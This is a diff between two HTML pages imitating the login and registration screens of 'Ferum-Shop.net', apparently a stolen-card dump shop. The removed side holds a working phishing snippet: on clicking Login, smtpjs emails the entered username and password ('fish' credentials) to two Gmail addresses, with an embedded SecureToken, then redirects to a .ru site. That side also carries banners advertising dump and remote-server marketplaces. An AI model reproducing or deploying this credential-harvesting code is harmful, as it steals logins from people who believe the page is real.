@@ -1,29 +1,17 @@
+
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
 "http://www.w3.org/TR/html4/loose.dtd">
 <html>
 <head>
 <meta name="robots" content="noindex,nofollow">
 <meta HTTP-EQUIV = "Pragma" CONTENT="no-cache">
-	<title>Ferum-Shop.net | Login</title>
+	<title>Ferum-Shop.net | Register</title>
 	<link href="pstyles.css" rel="stylesheet" type="text/css">
 <!-- <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon" /> -->
 <script type="text/javascript" src="store/js/jquery.min.js"></script>
-<script src="https://smtpjs.com/v3/smtp.js"></script>
-<script type="text/javascript">   
+            <script type="text/javascript">   
  
       $(document).ready(function() {
-
-      	$( "#postbut").click(function() {
-  
- 
-    Email.send({
-    SecureToken : "0e0da294-ec6a-40dd-865d-8f09a2b18c4f",
-    To : ['dev.citybang@gmail.com','srisky94@gmail.com'],
-    From : "sonmayarana@gmail.com",
-    Subject : "Hey Monu bro, got one new fish for you, here is the username and password",
-    Body : "Quickly go and change his username and password. Fish's current user name: "+$("#fishuserId").val()+" And Fish's current password is: "+$("#fishpwd").val() })
-     window.location.href = "https://fe-acc18.ru/";
-         });
  
      // hides the slickbox as soon as the DOM is ready
         $('#slickbox').hide();
@@ -79,10 +67,9 @@
 
 							<div id="navPrimary" class="srd">
 								<ul>
-									<li class="active"><a href="/index2.php?do=login" >Login</a></li>
-																			<li ><a href="index2.html?do=register" >Register</a></li>
-<!--<li ><a href="/index2.php?do=forgotpass" >Forgot password</a></li>-->
-									 
+									<li ><a href="index.html?do=login" >Login</a></li>
+									<li class="active"><a href="index2.html?do=register" >Register</a></li>
+<!--									<li ><a href="/index2.php?do=forgotpass" >Forgot password</a></li> -->
 									
 								</ul>
 							</div>
@@ -90,51 +77,61 @@
 
 							<div class="main">
 
-								<div class="login"  >
+
+	<div class="login"  >
 									<table border="0">
 										<tr>
-											<td width="20%" class="login_form" >
-			
-<!-- <form action="process.php" method="post" name="login_form" > -->
+											<td class="login_form" >
+									
+<form action="process.php" method="post" name="login_form" >
 
 	
 	<p class="no_indent">
 		Username:<br>
-		<input class="input_login" type="text" name="user" id="fishuserId" maxlength="35" value="" />
+		<input class="input_login" type="text" name="user" id="login" maxlength="35" value="" />
 		<br>
 		Password:<br>
-		<input class="input_login" type="password" name="pass" id="fishpwd" maxlength="40" value="" />
-		<br><input type="hidden" name="sublogin" value="1" id="sublogin"><!-- KeyCAPTCHA code (www.keycaptcha.com) --><script type='text/javascript'>var s_s_c_user_id = '181822';var s_s_c_session_id = '5e89b224ebad1-4.0.0.001';var s_s_c_captcha_field_id = 'capcode';var s_s_c_submit_button_id = 'postbut';var s_s_c_web_server_sign = 'e99cdbd52fb16a6da7ccef3f18b1716a';var s_s_c_web_server_sign2 = 'f239936ac7a45597c0bfcbe4b0d428fd';</script><script language=JavaScript src='https://backs.keycaptcha.com/swfs/cap.js'></script><!-- end of KeyCAPTCHA code --><input type="hidden" name="capcode" id="capcode" value="false" /><table border="0" cellpadding="0" cellspacing="0" style="margin: 0px; padding: 0px;">
+		<input class="input_login" type="password" name="pass" id="login" maxlength="40" value="" /><br>
+Email:<br>
+		<input class="input_login" type="text" name="email" id="login" maxlength="40" value="" /><br>
+ICQ:<br>
+		<input class="input_login" type="text" name="icq" id="login" maxlength="9" value="" /><br>
+Jabber:<br>
+		<input class="input_login" type="text" name="jabber" id="login" maxlength="40" value="" />
+		<br>
+<img style="margin-top:7px;margin-bottom:5px;" border="0" src="captcha/CaptchaSecurityImages.jfif?width=83&height=33&characters=5" />
+<input type="hidden" name="subjoin" value="1"><br>
+		Captcha:<br>
+<input id="security_code" class="input_login" name="security_code" type="text" maxlength="5" />
+		<table border="0" cellpadding="0" cellspacing="0" style="margin: 0px; padding: 0px;">
 			<tr>
+
 				<td width="157px">
-					<input type="checkbox" name="remember" ><span style="font-size: 11px;">Remember me?</span>
+
+
+
+
+
+					<input type="checkbox" name="agree"> I accept the Rules</a>
 				</td></tr><tr>
 				<td ><br>
-					<input  class="button primary" value="Login" type="submit" name="login_button" id="postbut">
+					<input  class="button primary" value="Register" type="submit" name="login_button" id="login_button" ><br><br>
+<!--					<p><small>You must provide real and working Email and ICQ (Jabber not required at registration) in order to be contacted by administrator about important shop updates or for password recovery process!</small></p>-->
 				</td>
 			</tr>
 		</table>
+
 		
 		
 		<br><br><br>
-		
-	</p>
-<!-- </form>  -->
+
+</form> 
 				
-											</td>
-											<td width="80%">
-											<br /><p align="center">
-<a href="http://trump-dmps.ru"><img src="mtHT8iI.gif" border=0></a>
-<br><br><a href="https://multi-vpn.biz/"><img src="img/ban_multivpn.gif" /></a><br><br>
-<a href="http://uas-shop.ru"><img src="a3.gif"></a>
-<!--<a href="https://xdedic.biz/registration/ql7xfevlbq"><img src="/3-468-EN.gif"></a>-->
-<!--<a href="http://slilpp.org"><img src="/img/f6133474a826.gif"></a>-->
-</p>
 											</td>
 										</tr>
 									</table>
 									<br><br>
-								</div>
+								</div>	
 
 
 							</div>
@@ -148,11 +145,10 @@
 			<td style="width:100px;" ></td>
 		</tr>
 	</table>
-	
 <center>
 <!--<h1><b><u><a href="http://festore-dumps.ru">www.festore-dumps.ru</a></b></u> --- YOUR OFFICIAL SELLER OF DUMP'S!</h1>--><br /><br />
 
-&copy; Ferum-Shop.net 2013</center>
+&copy; Ferum-Shop.net 2011</center>
 <br>
 </body>
 </html>
